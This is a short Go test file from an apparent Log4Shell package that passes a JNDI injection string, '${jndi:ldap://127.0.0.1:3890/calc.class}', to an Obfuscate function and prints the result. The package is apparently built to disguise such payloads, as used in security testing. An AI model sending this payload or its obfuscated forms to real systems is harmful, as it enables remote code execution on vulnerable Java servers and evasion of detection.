package log4shell

import (
	"fmt"
	"testing"
)

func TestObfuscate(t *testing.T) {
	obfuscated := Obfuscate("${jndi:ldap://127.0.0.1:3890/calc.class}")
	fmt.Println(obfuscated)
}
